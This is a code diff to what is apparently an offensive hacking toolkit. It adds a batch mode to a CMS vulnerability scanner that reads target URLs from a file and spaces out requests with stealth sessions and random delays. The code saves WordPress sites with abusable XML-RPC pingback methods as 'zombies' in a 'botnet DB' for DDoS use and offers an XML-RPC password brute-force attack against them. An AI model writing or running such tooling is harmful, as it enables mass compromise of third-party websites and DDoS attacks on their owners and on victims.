@@ -4250,17 +4250,9 @@ def _cms_jitter(lo=0.3, hi=1.5):
     time.sleep(random.uniform(lo, hi))
 
 
-def cms_vuln_scanner():
-    print_header("CMS Vulnerability Scanner")
-    if not exploit_disclaimer():
-        return
-
-    url = prompt("Target URL (e.g. https://target.com)")
-    if not url:
-        return
-    if not url.startswith(("http://", "https://")):
-        url = "https://" + url
-    url = url.rstrip("/")
+def _cms_scan_single(url, batch_mode=False):
+    """Core CMS scan logic for a single URL. Returns list of findings.
+    In batch_mode, brute-force prompts are skipped automatically."""
 
     session = _cms_stealth_session(url)
 
@@ -4281,7 +4273,7 @@ def cms_vuln_scanner():
                 time.sleep(wait)
             else:
                 print_err(f"Could not reach target after {max_retries} attempts: {e}")
-                return
+                return []
         except requests.exceptions.Timeout as e:
             if attempt < max_retries:
                 wait = 3 * attempt
@@ -4289,14 +4281,14 @@ def cms_vuln_scanner():
                 time.sleep(wait)
             else:
                 print_err(f"Target timed out after {max_retries} attempts: {e}")
-                return
+                return []
         except Exception as e:
             print_err(f"Could not reach target: {e}")
-            return
+            return []
 
     if resp is None:
         print_err("Could not reach target.")
-        return
+        return []
 
     try:
         body = resp.text.lower()
@@ -4314,7 +4306,7 @@ def cms_vuln_scanner():
             cms = "Shopify"
     except Exception as e:
         print_err(f"Error parsing response: {e}")
-        return
+        return []
 
     if not cms:
         print_warn("Could not detect a known CMS. Running generic checks...")
@@ -4578,20 +4570,129 @@ def cms_vuln_scanner():
                 if "pingback.ping" in xmlrpc_methods:
                     ddos_vecs.append("pingback.ping")
                 if ddos_vecs:
+                    # Check if already in DB before adding
+                    existing = _botnet_db_load()
+                    already_exists = any(z["url"] == url for z in existing)
                     _botnet_db_add(url, cms, ddos_vecs)
-                    print(f"    {G}[+]{RST} Zombie saved to botnet DB → {os.path.basename(BOTNET_DB)}")
+                    if already_exists:
+                        print(f"    {C}[~]{RST} Zombie already in DB — updated vectors/last_seen")
+                    else:
+                        print(f"    {G}[+]{RST} New zombie saved to botnet DB → {os.path.basename(BOTNET_DB)}")
 
-                # ── Offer brute-force attack ──
-                print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
-                run_bf = input(f"    {Y}Launch XML-RPC brute-force attack? (y/N):{RST} ").strip().lower()
-                if run_bf in ("y", "yes", "si", "s"):
-                    _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, xmlrpc_methods)
+                # ── Offer brute-force attack (skip in batch mode) ──
+                if not batch_mode:
+                    print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
+                    run_bf = input(f"    {Y}Launch XML-RPC brute-force attack? (y/N):{RST} ").strip().lower()
+                    if run_bf in ("y", "yes", "si", "s"):
+                        _cms_xmlrpc_bruteforce(url, xmlrpc_url, session, xmlrpc_methods)
+                else:
+                    print(f"\n    {Y}XML-RPC brute-force vector confirmed (skipped in batch mode).{RST}")
 
         except Exception:
             pass
 
     print(f"\n  {Y}{'═' * 50}{RST}")
     print_row("Findings", str(len(findings)))
+    return findings
+
+
+def cms_vuln_scanner():
+    print_header("CMS Vulnerability Scanner")
+    if not exploit_disclaimer():
+        return
+
+    print(f"\n  {C}[1]{RST} Single target")
+    print(f"  {C}[2]{RST} Batch scan from .txt file (one URL per line)")
+    mode = input(f"\n  {Y}Select mode [1/2]:{RST} ").strip()
+
+    if mode == "2":
+        # ── Batch mode ──
+        file_path = input(f"\n  {Y}Path to .txt file:{RST} ").strip()
+        if not file_path:
+            print_err("No file path provided.")
+            return
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                targets = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+        except FileNotFoundError:
+            print_err(f"File not found: {file_path}")
+            return
+        except Exception as e:
+            print_err(f"Error reading file: {e}")
+            return
+
+        if not targets:
+            print_err("No targets found in file.")
+            return
+
+        # Normalize URLs
+        normalized = []
+        for t in targets:
+            if not t.startswith(("http://", "https://")):
+                t = "https://" + t
+            normalized.append(t.rstrip("/"))
+        targets = normalized
+
+        # Load DB once to check for existing entries
+        existing_db = _botnet_db_load()
+        existing_urls = {z["url"] for z in existing_db}
+
+        print(f"\n  {G}Loaded {len(targets)} target(s) from file{RST}")
+        already_in_db = [t for t in targets if t in existing_urls]
+        new_targets = [t for t in targets if t not in existing_urls]
+
+        if already_in_db:
+            print(f"  {C}[~]{RST} {len(already_in_db)} target(s) already in botnet DB — will scan but skip DB insert if unchanged")
+
+        print(f"  {G}[>]{RST} Starting batch scan...\n")
+
+        total_findings = 0
+        vuln_count = 0
+
+        for i, target_url in enumerate(targets, 1):
+            print(f"\n  {M}{'━' * 55}{RST}")
+            print(f"  {M}[{i}/{len(targets)}]{RST} {W}{target_url}{RST}")
+            if target_url in existing_urls:
+                print(f"  {C}[~]{RST} Already in botnet DB — scanning for updates...")
+            print(f"  {M}{'━' * 55}{RST}")
+
+            findings = _cms_scan_single(target_url, batch_mode=True)
+            n = len(findings) if findings else 0
+            total_findings += n
+            if n > 0:
+                vuln_count += 1
+
+            # Jitter between targets in batch mode
+            if i < len(targets):
+                wait = random.uniform(2.0, 5.0)
+                print(f"\n  {C}Waiting {wait:.1f}s before next target...{RST}")
+                time.sleep(wait)
+
+        # ── Batch summary ──
+        print(f"\n\n  {Y}{'═' * 55}{RST}")
+        print(f"  {Y}  BATCH SCAN COMPLETE{RST}")
+        print(f"  {Y}{'═' * 55}{RST}")
+        print_row("Targets scanned", str(len(targets)))
+        print_row("With findings", str(vuln_count))
+        print_row("Total findings", str(total_findings))
+
+        # Show updated DB count
+        updated_db = _botnet_db_load()
+        new_zombies = len(updated_db) - len(existing_db)
+        if new_zombies > 0:
+            print_row("New zombies added", f"{new_zombies}")
+        print(f"  {Y}{'═' * 55}{RST}")
+        return
+
+    # ── Single target mode (default) ──
+    url = prompt("Target URL (e.g. https://target.com)")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    _cms_scan_single(url, batch_mode=False)
 
 
 # ─── 40. Payload Encoder / Decoder ───────────────────────────────────────────
